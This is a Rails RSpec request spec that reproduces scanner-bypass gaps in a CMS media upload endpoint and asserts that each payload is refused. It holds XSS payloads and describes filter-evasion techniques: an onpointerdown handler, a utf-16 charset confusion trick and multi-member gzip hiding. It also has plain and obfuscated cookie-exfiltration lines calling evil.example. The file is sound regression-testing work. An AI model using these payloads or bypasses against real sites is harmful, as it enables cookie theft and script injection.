# frozen_string_literal: true

require 'rails_helper'
require 'zlib'
require 'stringio'

# Reproduction for the two upload-scanning gaps reported against 2.9.2 and still present on master
# (AGENTS.md Ground Rules: a security fix ships with a test that reproduces the vulnerability).
#
# Both are gaps in *which scanner runs*, not in what a scanner concludes:
#
#   1. The strong parse-based checker is reached only by a literal `.svg` filename match. The same
#      bytes under any other markup extension fall through to the regex denylist, whose 57
#      event-handler stems do not include `onpointer*`. An external reporter found this case.
#   2. Executable script is scanned by the same denylist, which has nothing to say about
#      JavaScript -- no elements, no handler attributes, no blocked schemes to match.
#
# Driven through the real media endpoint rather than the module, so the request context that
# AdminController populates -- the input to the permission decision -- is the real one.
RSpec.describe 'Markup and script upload scanning', type: :request do
  init_site

  let(:current_site) { Cama::Site.first.decorate }

  # Well-formed XML *and* valid HTML (inline SVG), so one payload can be uploaded under every
  # extension below and the difference in outcome is attributable to routing alone. `onpointerdown`
  # is the reported handler: the parse-based checker rejects it by shape, the denylist has no stem
  # that matches it.
  let(:markup_payload) do
    %(<svg xmlns="http://www.w3.org/2000/svg"><rect onpointerdown="alert(1)" width="10" height="10"/></svg>)
  end

  let(:gzipped_markup_payload) do
    buffer = StringIO.new(+'', 'wb')
    gzip = Zlib::GzipWriter.new(buffer)
    gzip.write(markup_payload)
    gzip.close
    buffer.string
  end

  # A role with media management and nothing else: the least-privileged account that can reach the
  # upload endpoint at all, and therefore the one the scan exists to constrain.
  let(:role) { current_site.user_roles.create!(name: 'Media only', slug: 'media-only-repro') }
  let(:user) { create(:user, role: role.slug, site: current_site) }

  before { role.set_meta("_manager_#{current_site.id}", { 'media' => 1 }) }

  def upload(content, extension:)
    sign_in_as(user, site: current_site)
    file = Tempfile.new(['repro-scan', extension], binmode: true)
    file.write(content)
    file.rewind
    post '/admin/media/upload',
         params: { file_upload: Rack::Test::UploadedFile.new(file.path, 'application/octet-stream'), folder: '' }
  ensure
    file&.close!
  end

  describe 'markup routing' do
    # Control case: proves the payload really is dangerous and the strong checker really does catch
    # it. Without this, a green suite could mean the payload was harmless all along.
    it 'refuses the payload under the .svg extension' do
      upload(markup_payload, extension: '.svg')

      expect(response.body).to include('Potentially malicious content found!')
    end

    %w[.html .htm .xhtml .xml].each do |extension|
      it "refuses the identical payload under the #{extension} extension" do
        upload(markup_payload, extension: extension)

        expect(response.body).to include('Potentially malicious content found!')
      end
    end
  end

  describe 'encoding-confused markup' do
    # A pure-ASCII HTML document declaring utf-16 fires its handler in the browser (WHATWG maps a
    # utf-16 <meta charset> back to UTF-8) while the HTML parser re-decodes the bytes as utf-16 and
    # sees no handler. The scan must not depend on the parser agreeing with the browser about the
    # encoding.
    it 'refuses an .html whose <meta charset> hides a handler from the parser' do
      upload(%(<!doctype html><meta charset="utf-16"><img src=x onerror="alert(1)">), extension: '.html')

      expect(response.body).to include('Potentially malicious content found!')
    end
  end

  describe 'compressed markup' do
    # Gzip output is high-entropy: no regex matches it and no parser reads it, so a `.svgz` is
    # scanned today in name only.
    it 'refuses a gzipped payload under the .svgz extension' do
      upload(gzipped_markup_payload, extension: '.svgz')

      expect(response.body).to include('Potentially malicious content found!')
    end

    # GzipReader#read stops at the first member; a compliant decoder concatenates every member. A
    # clean decoy member cannot hide the hostile bytes that follow it.
    it 'refuses a multi-member gzip that hides the payload past the first member' do
      multi_member = ['<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/>',
                      '<rect onpointerdown="alert(1)"/></svg>'].map do |member|
        buffer = StringIO.new(+'', 'wb')
        writer = Zlib::GzipWriter.new(buffer)
        writer.write(member)
        writer.close
        buffer.string
      end.join
      upload(multi_member, extension: '.svgz')

      expect(response.body).to include('Potentially malicious content found!')
    end
  end

  describe 'executable script' do
    let(:exfiltration_payload) { %(fetch('https://evil.example/c?'+document.cookie)) }

    %w[.js .mjs .cjs .wasm].each do |extension|
      it "refuses a script payload under the #{extension} extension" do
        upload(exfiltration_payload, extension: extension)

        expect(response.body).to include('Potentially malicious content found!')
      end
    end

    # Any content-based rule is defeated by string construction, which is why the remedy is the
    # permission and not a smarter scan.
    it 'refuses an obfuscated script payload the same way' do
      upload(%(window['fet'+'ch']('//evil.example/'+document['coo'+'kie'])), extension: '.js')

      expect(response.body).to include('Potentially malicious content found!')
    end
  end
end
